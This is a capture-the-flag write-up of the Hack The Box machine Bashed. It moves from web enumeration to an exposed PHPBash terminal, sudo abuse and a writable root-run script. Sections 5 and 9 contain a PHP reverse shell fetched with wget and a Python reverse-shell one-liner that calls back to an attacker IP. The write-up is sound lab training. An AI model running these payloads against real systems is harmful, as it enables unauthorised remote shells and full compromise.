# Hack The Box - Bashed
> **Machine Name:** Bashed  
> **Platform:** Hack The Box  
> **Difficulty:** Easy  
> **Target IP:** `10.10.10.68`  
> **Primary Service:** HTTP / Apache 2.4.18  
> **Initial Access:** Exposed PHPBash web terminal → `www-data`  
> **Privilege Escalation:** `www-data` → `scriptmanager` → `root`  
> **Final Result:** Root access

---
## 1. Enumeration:

### Nmap:

The first step was to identify the exposed services and their versions.
```
nmap -A -T4 -p- 10.10.10.68
```
![](../../../../z%20(Attachments)/Pasted%20image%2020260810220353.png)

| Port | State | Service | Version                        |
| ---- | ----- | ------- | ------------------------------ |
| 80   | open  | tcp     | Apache httpd 2.4.18 ((Ubuntu)) |

---
### SearchSploit:

The Apache version was checked against SearchSploit:
```
searchsploit apache 2.4
```

![565](../../../../z%20(Attachments)/Pasted%20image%2020260810222327.png)

no direct Apache exploit was used during the attack.

---
# 2. Web Enumeration:

Gobuster was used to discover hidden directories and files on the web server.

```
gobuster dir -u http://10.10.10.68/ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt
```
A `/dev` directory was discovered:

```
http://10.10.10.68/dev/
```

![](../../../../z%20(Attachments)/Pasted%20image%2020260810232353.png)

PHPBash provides a web-based terminal, making this a potentially serious security issue.

---
## 3. Initial Access:

### PHPBash Web Terminal:

Opening:

```
http://10.10.10.68/dev/phpbash.php
```
The terminal allowed commands to be executed on the target system.

The current account was effectively the web-server user:
```
www-data
```
filesystem could also be explored through the terminal.

![](../../../../z%20(Attachments)/Pasted%20image%2020260810232557.png)

The original evidence showed access to the `/home` directory and the users:
```
arrexel
scriptmanager
```
the `user.txt` file was also located under the `arrexel` home directory.

---
## 4. Privilege Enumeration:

After obtaining command execution, the next step was to determine what privileges the current user had.
```
sudo -l
```

![](../../../../git%20repos/Attachments/Pasted%20image%2020260812014028.png)

The output revealed:
```
(scriptmanager : scriptmanager) NOPASSWD: ALL
```
This meant that `www-data` could execute commands as the `scriptmanager` user without supplying a password.

However, attempting:
```
sudo su scriptmanager
```
initially failed because the shell did not have a proper TTY.

---
## 5. Obtaining a Reverse Shell

To obtain a more practical shell, a PHP reverse shell was used.
- Download the file.
	[php-reverse-shell-1.0.tar.gz](http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz)
The reverse-shell file was configured with the attacker's IP address and port

![200](../../../../z%20(Attachments)/Pasted%20image%2020260811131026.png)

A temporary HTTP server was started to host the file:
```
python -m http.server 80
```

The target could then download the file using:
```
wget http://<your-ip>/rev.php
```

![](../../../../git%20repos/Attachments/Pasted%20image%2020260811234533.png)

A Netcat listener was started on the attacker machine:
```
nc -nvlp 1234
```

The PHP reverse shell was then accessed through the target:
```
http://10.10.10.68/uploads/rev.php
```

This resulted in a shell as:
```
www-data
```

![](../../../../git%20repos/Attachments/Pasted%20image%2020260812000205.png)

successfully got the shell but still the same problem of no tty present.

---
## 6. Shell Stabilization:

The reverse shell was functional but had no proper TTY.
![](../../../../git%20repos/Attachments/Pasted%20image%2020260812155837.png)

Search `tty escape` into the google :(https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell)

The shell was upgraded using Python:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

![](../../../../git%20repos/Attachments/Pasted%20image%2020260812013453.png)

succesfully the shell was improved.

---
## 7. Escalation to scriptmanager:

After stabilizing the shell, the previously discovered sudo permission was used:

```
sudo -u scriptmanager /bin/bash
```

This successfully resulted in a shell as:

```
scriptmanager
```

The privilege chain was now:

```
www-data → scriptmanager
```

![](../../../../git%20repos/Attachments/Pasted%20image%2020260812163449.png)

---
## 8. Enumerating scriptmanager:

After becoming `scriptmanager`, the filesystem was examined.

A `scripts` directory was found with permissions allowing `scriptmanager` to write to it.

![](../../../../git%20repos/Attachments/Pasted%20image%2020260812020215.png)

Inside the directory was:
```
test.py
```

![](../../../../git%20repos/Attachments/Pasted%20image%2020260812130938.png)

The important observation was that **a script in this directory could be modified by the `scriptmanager` user**.

---
## 9. Privilege Escalation to Root:

The original `test.py` was removed and replaced with attacker-controlled Python code.

The replacement code created **a reverse shell** connection back to the attacker.

 `test.py` with  a revers shell payload:
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket,SOCK_STREAM);s.connect(("10.10.14.21",2345));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

The attacker hosted the modified file:
```
python -m http.server 80
```

The target downloaded it:
```
wget http://10.10.14.21/test.py
```

A listener was then started:
```
nc -nvlp 2345
```

The Python script was executed:
```
python test.py
```

The listener received the connection.

 ![](../../../../git%20repos/Attachments/Pasted%20image%2020260812140022.png)
 
 **The final attack chain was therefore:**

```
Internet
   ↓
HTTP / Apache
   ↓
/dev/
   ↓
phpbash.php
   ↓
www-data
   ↓
sudo NOPASSWD
   ↓
scriptmanager
   ↓
Writable test.py
   ↓
Root shell
```

## 10. Risk Analysis:

The overall risk is **Critical** because the vulnerabilities could be chained together to obtain complete control of the target.

|Finding|Risk|Impact|
|---|---|---|
|Exposed PHPBash terminal|**Critical**|Provided direct command execution through the web server.|
|Excessive sudo permission|**Critical**|Allowed `www-data` to execute commands as `scriptmanager` without a password.|
|Writable privileged script|**Critical**|Allowed attacker-controlled code to be executed with elevated privileges, resulting in root access.|

The most serious issue was the combination of excessive privileges and a writable script. Together, these allowed the attack to progress from a low-privileged web-server account to **full root access**.

# 12. Conclusion

The Bashed assessment successfully demonstrated a complete compromise of the target.

The attack began with **HTTP enumeration**, followed by discovery of the exposed `/dev` directory and the PHPBash web terminal. This provided command execution as `www-data`.

Local privilege enumeration then revealed a **NOPASSWD sudo permission** that allowed `www-data` to become `scriptmanager`.

After stabilizing the shell, a writable Python script was identified and replaced with attacker-controlled code. Executing the modified script resulted in a reverse shell where:
```
whoami
```

returned:
```
root
```